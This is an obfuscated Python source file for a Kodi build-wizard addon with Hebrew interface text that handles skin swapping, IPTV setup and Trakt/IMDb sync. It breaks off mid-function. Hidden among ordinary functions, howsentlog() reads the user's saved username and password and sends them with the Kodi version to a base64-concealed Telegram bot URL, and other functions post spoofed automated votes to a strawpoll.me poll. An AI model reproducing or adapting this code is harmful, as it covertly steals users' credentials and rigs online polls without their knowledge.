# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
IPTVSIMPL18 =uservar .IPTVSIMPL18 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
def MainMenu ():#line:256
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:258
def skinWIN ():#line:259
	idle ()#line:260
	O0000O0OO0O000000 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:261
	O0OOO00OO0O0O00O0 =[];O0OO0OO0000OOO0O0 =[]#line:262
	for O00OO0OOO0OO0OO0O in sorted (O0000O0OO0O000000 ,key =lambda O0OOOO0000000O00O :O0OOOO0000000O00O ):#line:263
		OOO0O0O000O000O00 =os .path .split (O00OO0OOO0OO0OO0O [:-1 ])[1 ]#line:264
		OOO00OOOOO0000O00 =os .path .join (O00OO0OOO0OO0OO0O ,'addon.xml')#line:265
		if os .path .exists (OOO00OOOOO0000O00 ):#line:266
			OO0O0O0OO0O0OO00O =open (OOO00OOOOO0000O00 )#line:267
			OO00000OOO0OOO000 =OO0O0O0OO0O0OO00O .read ()#line:268
			O000O0O00O000O00O =parseDOM2 (OO00000OOO0OOO000 ,'addon',ret ='id')#line:269
			OOOO0OO0O0OO00000 =OOO0O0O000O000O00 if len (O000O0O00O000O00O )==0 else O000O0O00O000O00O [0 ]#line:270
			try :#line:271
				O0O000O00OOO000OO =xbmcaddon .Addon (id =OOOO0OO0O0OO00000 )#line:272
				O0OOO00OO0O0O00O0 .append (O0O000O00OOO000OO .getAddonInfo ('name'))#line:273
				O0OO0OO0000OOO0O0 .append (OOOO0OO0O0OO00000 )#line:274
			except :#line:275
				pass #line:276
	OOO0OO0OO000O0OO0 =[];OOO0O000O00O0OOOO =0 #line:277
	OOOOO0O0OO00OOOO0 =["Current Skin -- %s"%currSkin ()]+O0OOO00OO0O0O00O0 #line:278
	OOO0O000O00O0OOOO =DIALOG .select ("Select the Skin you want to swap with.",OOOOO0O0OO00OOOO0 )#line:279
	if OOO0O000O00O0OOOO ==-1 :return #line:280
	else :#line:281
		O0O0OOO0O0OOO000O =(OOO0O000O00O0OOOO -1 )#line:282
		OOO0OO0OO000O0OO0 .append (O0O0OOO0O0OOO000O )#line:283
		OOOOO0O0OO00OOOO0 [OOO0O000O00O0OOOO ]="%s"%(O0OOO00OO0O0O00O0 [O0O0OOO0O0OOO000O ])#line:284
	if OOO0OO0OO000O0OO0 ==None :return #line:285
	for O0O0O00O0OOO0OOO0 in OOO0OO0OO000O0OO0 :#line:286
		swapSkins (O0OO0OO0000OOO0O0 [O0O0O00O0OOO0OOO0 ])#line:287
def currSkin ():#line:289
	return xbmc .getSkinDir ('Container.PluginName')#line:290
def swapSkins (OO0000O0OO0O00O0O ,title ="Error"):#line:291
	O0OO0000OO00O00OO ='lookandfeel.skin'#line:292
	OOOO000O000OOO000 =OO0000O0OO0O00O0O #line:293
	O00OOO000OO0OO00O =getOld (O0OO0000OO00O00OO )#line:294
	OOO0O00OOOO00OOOO =O0OO0000OO00O00OO #line:295
	setNew (OOO0O00OOOO00OOOO ,OOOO000O000OOO000 )#line:296
	O00OOO00OOOOOOOOO =0 #line:297
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOO00OOOOOOOOO <100 :#line:298
		O00OOO00OOOOOOOOO +=1 #line:299
		xbmc .sleep (1 )#line:300
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:301
		xbmc .executebuiltin ('SendClick(11)')#line:302
	return True #line:303
def getOld (OOOOO0OOO00OOOOO0 ):#line:305
	try :#line:306
		OOOOO0OOO00OOOOO0 ='"%s"'%OOOOO0OOO00OOOOO0 #line:307
		O000OO00O0OOOOO0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOOOO0OOO00OOOOO0 )#line:308
		O0OOO00O00O000O0O =xbmc .executeJSONRPC (O000OO00O0OOOOO0O )#line:310
		O0OOO00O00O000O0O =simplejson .loads (O0OOO00O00O000O0O )#line:311
		if O0OOO00O00O000O0O .has_key ('result'):#line:312
			if O0OOO00O00O000O0O ['result'].has_key ('value'):#line:313
				return O0OOO00O00O000O0O ['result']['value']#line:314
	except :#line:315
		pass #line:316
	return None #line:317
def setNew (OOO0OO00O0O0O0000 ,OOOO0O0O0O000O00O ):#line:320
	try :#line:321
		OOO0OO00O0O0O0000 ='"%s"'%OOO0OO00O0O0O0000 #line:322
		OOOO0O0O0O000O00O ='"%s"'%OOOO0O0O0O000O00O #line:323
		O0OOOO00O000OO0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0OO00O0O0O0000 ,OOOO0O0O0O000O00O )#line:324
		O0O0OOO0000OO0O0O =xbmc .executeJSONRPC (O0OOOO00O000OO0O0 )#line:326
	except :#line:327
		pass #line:328
	return None #line:329
def idle ():#line:330
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:331
def resetkodi ():#line:333
		if xbmc .getCondVisibility ('system.platform.windows'):#line:334
			O00O0O0OO0O00OOO0 =xbmcgui .DialogProgress ()#line:335
			O00O0O0OO0O00OOO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:338
			O00O0O0OO0O00OOO0 .update (0 )#line:339
			for O0OOO00O00O00O000 in range (5 ,-1 ,-1 ):#line:340
				time .sleep (1 )#line:341
				O00O0O0OO0O00OOO0 .update (int ((5 -O0OOO00O00O00O000 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OOO00O00O00O000 ),'')#line:342
				if O00O0O0OO0O00OOO0 .iscanceled ():#line:343
					from resources .libs import win #line:344
					return None ,None #line:345
			from resources .libs import win #line:346
		else :#line:347
			O00O0O0OO0O00OOO0 =xbmcgui .DialogProgress ()#line:348
			O00O0O0OO0O00OOO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:351
			O00O0O0OO0O00OOO0 .update (0 )#line:352
			for O0OOO00O00O00O000 in range (5 ,-1 ,-1 ):#line:353
				time .sleep (1 )#line:354
				O00O0O0OO0O00OOO0 .update (int ((5 -O0OOO00O00O00O000 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOO00O00O00O000 ),'')#line:355
				if O00O0O0OO0O00OOO0 .iscanceled ():#line:356
					os ._exit (1 )#line:357
					return None ,None #line:358
			os ._exit (1 )#line:359
def backtokodi ():#line:361
			wiz .kodi17Fix ()#line:362
			fix18update ()#line:363
			fix17update ()#line:364
def testcommand1 ():#line:366
    import requests #line:367
    OO000O0000OO00000 ='18773068'#line:368
    O0O0OOOOOO00OOOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO000O0000OO00000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:380
    O0OO000O000O0OO0O ='145273320'#line:382
    OO00O0000O0OO0O00 ='145272688'#line:383
    if ADDON .getSetting ("auto_rd")=='true':#line:384
        O00OO00OOOOOOOOOO =O0OO000O000O0OO0O #line:385
    else :#line:386
        O00OO00OOOOOOOOOO =OO00O0000O0OO0O00 #line:387
    O000O0OOO00OO00OO ={'options':O00OO00OOOOOOOOOO }#line:391
    O0OOO0OO0000OO000 =requests .post ('https://www.strawpoll.me/'+OO000O0000OO00000 ,headers =O0O0OOOOOO00OOOOO ,data =O000O0OOO00OO00OO )#line:393
def builde_Votes ():#line:394
   try :#line:395
        import requests #line:396
        O00O00O0OO0OOOO0O ='18773068'#line:397
        O000000OOOO00O000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00O00O0OO0OOOO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:409
        O0O00O0OOOO0O0000 ='145273320'#line:411
        O0O000O0O00OO00OO ={'options':O0O00O0OOOO0O0000 }#line:417
        O00000OOOOOOOO0O0 =requests .post ('https://www.strawpoll.me/'+O00O00O0OO0OOOO0O ,headers =O000000OOOO00O000 ,data =O0O000O0O00OO00OO )#line:419
   except :pass #line:420
def update_Votes ():#line:421
   try :#line:422
        import requests #line:423
        O0OO00O0OOOOOO000 ='18773068'#line:424
        O0OO0OO00OO00O0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OO00O0OOOOOO000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:436
        OOO0O0O000OOO0000 ='145273321'#line:438
        OOOOO0OOO0O00O0O0 ={'options':OOO0O0O000OOO0000 }#line:444
        O00O0OO00O000O0OO =requests .post ('https://www.strawpoll.me/'+O0OO00O0OOOOOO000 ,headers =O0OO0OO00OO00O0OO ,data =OOOOO0OOO0O00O0O0 )#line:446
   except :pass #line:447
def testcommand ():#line:451
    wiz .kodi17fix ()#line:452
def skin_homeselect ():#line:453
	try :#line:455
		O0OOO000O0OOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:456
		O0000O00OOOO000OO =open (O0OOO000O0OOO00O0 ,'r')#line:458
		OO0O00000O0OO0OOO =O0000O00OOOO000OO .read ()#line:459
		O0000O00OOOO000OO .close ()#line:460
		OO000OO00OOOO0OOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:461
		O0OOOO0000O0OOO00 =re .compile (OO000OO00OOOO0OOO ).findall (OO0O00000O0OO0OOO )[0 ]#line:462
		O0000O00OOOO000OO =open (O0OOO000O0OOO00O0 ,'w')#line:463
		O0000O00OOOO000OO .write (OO0O00000O0OO0OOO .replace ('<setting id="HomeS" type="string%s/setting>'%O0OOOO0000O0OOO00 ,'<setting id="HomeS" type="string"></setting>'))#line:464
		O0000O00OOOO000OO .close ()#line:465
	except :#line:466
		pass #line:467
def autotrakt ():#line:470
    O0000000000OOOO0O =(ADDON .getSetting ("auto_trk"))#line:471
    if O0000000000OOOO0O =='true':#line:472
       from resources .libs import trk_aut #line:473
def traktsync ():#line:475
     O0000000O0OOOO0O0 =(ADDON .getSetting ("auto_trk"))#line:476
     if O0000000O0OOOO0O0 =='true':#line:477
       from resources .libs import trk_aut #line:480
     else :#line:481
        ADDON .openSettings ()#line:482
def imdb_synck ():#line:484
   try :#line:485
     OOO0O0O0O0O0O00O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:486
     O0000000OOOOOO00O =xbmcaddon .Addon ('plugin.video.gaia')#line:487
     O00OO0OOOOO00OO0O =(ADDON .getSetting ("imdb_sync"))#line:488
     OO00O00OO00000000 ="imdb.user"#line:489
     O00OOO000O0O0O0O0 ="accounts.informants.imdb.user"#line:490
     OOO0O0O0O0O0O00O0 .setSetting (OO00O00OO00000000 ,str (O00OO0OOOOO00OO0O ))#line:491
     O0000000OOOOOO00O .setSetting ('accounts.informants.imdb.enabled','true')#line:492
     O0000000OOOOOO00O .setSetting (O00OOO000O0O0O0O0 ,str (O00OO0OOOOO00OO0O ))#line:493
   except :pass #line:494
def dis_or_enable_addon (OOO0O0OO0OO0OO0OO ,O0OO0O0OO0OOOO0OO ,enable ="true"):#line:496
    import json #line:497
    OO0OO0000O0OO0O00 ='"%s"'%OOO0O0OO0OO0OO0OO #line:498
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0O0OO0OO0OO0OO )and enable =="true":#line:499
        logging .warning ('already Enabled')#line:500
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO0O0OO0OO0OO0OO )#line:501
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0O0OO0OO0OO0OO )and enable =="false":#line:502
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO0O0OO0OO0OO0OO )#line:503
    else :#line:504
        OO00OO000O0OO0OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0OO0000O0OO0O00 ,enable )#line:505
        O0OO000OOO00OOOO0 =xbmc .executeJSONRPC (OO00OO000O0OO0OOO )#line:506
        OOO00O0OOOOO0O0OO =json .loads (O0OO000OOO00OOOO0 )#line:507
        if enable =="true":#line:508
            xbmc .log ("### Enabled %s, response = %s"%(OOO0O0OO0OO0OO0OO ,OOO00O0OOOOO0O0OO ))#line:509
        else :#line:510
            xbmc .log ("### Disabled %s, response = %s"%(OOO0O0OO0OO0OO0OO ,OOO00O0OOOOO0O0OO ))#line:511
    if O0OO0O0OO0OOOO0OO =='auto':#line:512
     return True #line:513
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:514
def iptvset ():#line:517
  try :#line:518
    OO0000O00OOOOO000 =(ADDON .getSetting ("iptv_on"))#line:519
    if OO0000O00OOOOO000 =='true':#line:521
       if KODIV >=17 and KODIV <18 :#line:523
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:524
         O0O00O00O0O0000OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:525
         O00OO00OOOO00OO00 =(ADDON .getSetting ("iptvUrl"))#line:527
         O0O00O00O0O0000OO .setSetting ('m3uUrl',O00OO00OOOO00OO00 )#line:528
         OO0OOOO000000OOOO =(ADDON .getSetting ("epg_Url"))#line:529
         O0O00O00O0O0000OO .setSetting ('epgUrl',OO0OOOO000000OOOO )#line:530
       if KODIV >=18 :#line:533
         iptvsimpldown ()#line:534
         wiz .kodi17Fix ()#line:535
         xbmc .sleep (1000 )#line:536
         O0O00O00O0O0000OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:537
         O00OO00OOOO00OO00 =(ADDON .getSetting ("iptvUrl"))#line:538
         O0O00O00O0O0000OO .setSetting ('m3uUrl',O00OO00OOOO00OO00 )#line:539
         OO0OOOO000000OOOO =(ADDON .getSetting ("epg_Url"))#line:540
         O0O00O00O0O0000OO .setSetting ('epgUrl',OO0OOOO000000OOOO )#line:541
  except :pass #line:543
def howsentlog ():#line:550
       try :#line:551
          import json #line:552
          O0O000OO00OO0OO0O =(ADDON .getSetting ("user"))#line:553
          OOOOOO00O0O0O0O00 =(ADDON .getSetting ("pass"))#line:554
          OO00O0OOOOO0OOOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:555
          O00OOO0OOOOO00O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:557
          OO00OO000O00O0OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:558
          OOOOOOOO0OOOO0000 =str (json .loads (OO00OO000O00O0OO0 )['ip'])#line:559
          O00OOOOOOOOO00O00 =O0O000OO00OO0OO0O #line:560
          O0OOOOO00OOO0O000 =OOOOOO00O0O0O0O00 #line:561
          import socket #line:563
          OO00OO000O00O0OO0 =urllib2 .urlopen (O00OOO0OOOOO00O0O .decode ('base64')+' - '+O00OOOOOOOOO00O00 +' - '+O0OOOOO00OOO0O000 +' - '+OO00O0OOOOO0OOOO0 ).readlines ()#line:564
       except :pass #line:565
def googleindicat ():#line:568
			import logg #line:569
			OO0OO0O000O00OO0O =(ADDON .getSetting ("pass"))#line:570
			OO000OO0000OOO0OO =(ADDON .getSetting ("user"))#line:571
			logg .logGA (OO0OO0O000O00OO0O ,OO000OO0000OOO0OO )#line:572
def logsend ():#line:573
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:574
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:575
      howsentlog ()#line:577
      import requests #line:578
      if xbmc .getCondVisibility ('system.platform.windows'):#line:579
